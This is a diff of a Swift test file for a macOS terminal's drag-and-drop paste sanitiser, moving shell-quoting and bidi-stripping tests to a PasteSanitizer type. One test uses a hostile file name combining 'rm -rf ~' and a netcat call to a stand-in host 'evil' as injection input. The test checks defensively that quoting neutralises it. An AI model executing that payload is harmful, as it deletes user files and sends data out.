@@ -5,23 +5,23 @@ import AppKit
 final class DragDropTests: XCTestCase {
     /// `shellQuote` wraps a path in single quotes and escapes embedded singles.
     func testShellQuoteSimple() {
-        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/bar.png"),
+        XCTAssertEqual(PasteSanitizer.shellQuote("/Users/foo/bar.png"),
                        "'/Users/foo/bar.png'")
     }
 
     func testShellQuoteWithSpaces() {
-        XCTAssertEqual(TerminalView.shellQuote("/Users/foo/my image.png"),
+        XCTAssertEqual(PasteSanitizer.shellQuote("/Users/foo/my image.png"),
                        "'/Users/foo/my image.png'")
     }
 
     func testShellQuoteWithEmbeddedSingleQuote() {
         // Classic POSIX recipe: close quote, escaped single, reopen.
-        XCTAssertEqual(TerminalView.shellQuote("/tmp/don't.txt"),
+        XCTAssertEqual(PasteSanitizer.shellQuote("/tmp/don't.txt"),
                        "'/tmp/don'\\''t.txt'")
     }
 
     func testJoinedMultiFile() {
-        let joined = TerminalView.joinedDroppedPaths([
+        let joined = PasteSanitizer.joinedDroppedPaths([
             "/a/one.png",
             "/b/two three.png",
         ])
@@ -33,7 +33,7 @@ final class DragDropTests: XCTestCase {
         // semicolons, pipes. Single-quote wrapping neutralises all of
         // them — test verifies the quoter doesn't collapse anything.
         let name = "$(rm -rf ~) ; echo `whoami` | nc evil 1234"
-        let quoted = TerminalView.shellQuote(name)
+        let quoted = PasteSanitizer.shellQuote(name)
         // Metachars pass through literally; the outer single quotes
         // turn them into plain characters for the shell.
         XCTAssertTrue(quoted.hasPrefix("'"))
@@ -45,16 +45,16 @@ final class DragDropTests: XCTestCase {
         // An empty-string path (edge-case from misbehaving
         // NSPasteboard reader) becomes just `''` — harmless when
         // pasted into the shell as a positional arg.
-        XCTAssertEqual(TerminalView.shellQuote(""), "''")
+        XCTAssertEqual(PasteSanitizer.shellQuote(""), "''")
     }
 
     func testJoinedDroppedPaths_emptyArray() {
-        XCTAssertEqual(TerminalView.joinedDroppedPaths([]), "")
+        XCTAssertEqual(PasteSanitizer.joinedDroppedPaths([]), "")
     }
 
     func testJoinedDroppedPaths_singleFile() {
         XCTAssertEqual(
-            TerminalView.joinedDroppedPaths(["/only/one.txt"]),
+            PasteSanitizer.joinedDroppedPaths(["/only/one.txt"]),
             "'/only/one.txt'"
         )
     }
@@ -349,7 +349,7 @@ final class DragDropTests: XCTestCase {
         for vs: UInt8 in 0x80...0x8F {
             let input = Data([0x61, 0xEF, 0xB8, vs, 0x62])
             XCTAssertEqual(
-                TerminalView.stripBidiOverrides(input), input,
+                PasteSanitizer.stripBidiOverrides(input), input,
                 "VS at byte EF B8 \(String(vs, radix: 16, uppercase: true)) must be PRESERVED, not stripped"
             )
         }
@@ -363,10 +363,10 @@ final class DragDropTests: XCTestCase {
     /// guards the boundary between the two sub-ranges.
     func test_stripBidiOverrides_preservesVariationSelectors17to256() {
         let vs17 = Data([0x61, 0xF3, 0xA0, 0x84, 0x80, 0x62]) // U+E0100
-        XCTAssertEqual(TerminalView.stripBidiOverrides(vs17), vs17,
+        XCTAssertEqual(PasteSanitizer.stripBidiOverrides(vs17), vs17,
                        "VS17 (U+E0100) must be PRESERVED, not stripped")
         let vs256 = Data([0x61, 0xF3, 0xA0, 0x87, 0xAF, 0x62]) // U+E01EF
-        XCTAssertEqual(TerminalView.stripBidiOverrides(vs256), vs256,
+        XCTAssertEqual(PasteSanitizer.stripBidiOverrides(vs256), vs256,
                        "VS256 (U+E01EF) must be PRESERVED, not stripped")
     }
 
@@ -389,7 +389,7 @@ final class DragDropTests: XCTestCase {
         ])
         let expected = Data([0x61, 0xEF, 0xB8, 0x8F, 0x62]) // "a" + U+FE0F + "b"
         XCTAssertEqual(
-            TerminalView.stripBidiOverrides(payload), expected,
+            PasteSanitizer.stripBidiOverrides(payload), expected,
             "RLO + ZWSP must be stripped while the interleaved VS16 is preserved"
         )
     }
